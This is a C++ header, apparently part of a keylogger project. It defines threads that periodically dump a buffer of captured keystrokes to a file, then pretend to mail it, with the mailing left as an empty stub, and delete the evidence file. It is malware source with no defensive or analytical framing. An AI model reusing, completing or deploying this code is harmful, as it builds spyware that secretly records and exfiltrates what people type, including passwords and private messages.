#ifndef THREAD_HANDLER
#define THREAD_HANDLER

#include <string>
#include <chrono>
#include <thread>
#include <functional>

#include "file_handler.h"
#include "key_proc.h"

using namespace std;

namespace thread_handler
{
    struct thr
    {
    public:
        bool run;
        function<void(int, bool &)> funct;
        int time;
        future<void> res;

        thr(bool r, function<void(int, bool &)> f, int t) : run(r), funct(f), time(t) {}
        thr() : run(false), funct(NULL), time(-1) {}

        void caller();
        void stopper();
    };

    void thr::caller()
    {
        res = async(launch::async, [this]() {
            this->funct(this->time, this->run);
        });
    }

    void thr::stopper()
    {
        run = false;
        res.get();
    }

    //bool run = false;

    void timer(int t, bool &run)
    {
        file_handler::write_logs("Write Thread created");
        bool check = false;
        while (run)
        {
            file_handler::write_logs("Write Timer started");
            this_thread::sleep_for(chrono::seconds(t));
            file_handler::write_logs("Write Timer expired");
            check = file_handler::write_intercept(key_proc::captured.str());
            if (!check)
                run = false;
            key_proc::captured.str("");
        }
        file_handler::write_logs("Write Thread stopped");
    }

    void mailer(int t, bool &run)
    {
        file_handler::write_logs("Mail Thread created");
        int check = 1;
        while (run)
        {
            file_handler::write_logs("Mail Timer started");
            this_thread::sleep_for(chrono::seconds(t));
            file_handler::write_logs("Mail Timer expired");

            //
            file_handler::write_logs("Mail sended");
            //
            check = remove(file_handler::get_full_path().c_str());
            if (check == 0)
                file_handler::write_logs("Deleted --> " + file_handler::name);
            else
                file_handler::write_logs("Cant delete --> " + file_handler::name);

            file_handler::name = date_time::get_date_time("-", "-");
        }
        file_handler::write_logs("Mail Thread stopped");
    }

} // namespace thread_handler

#endif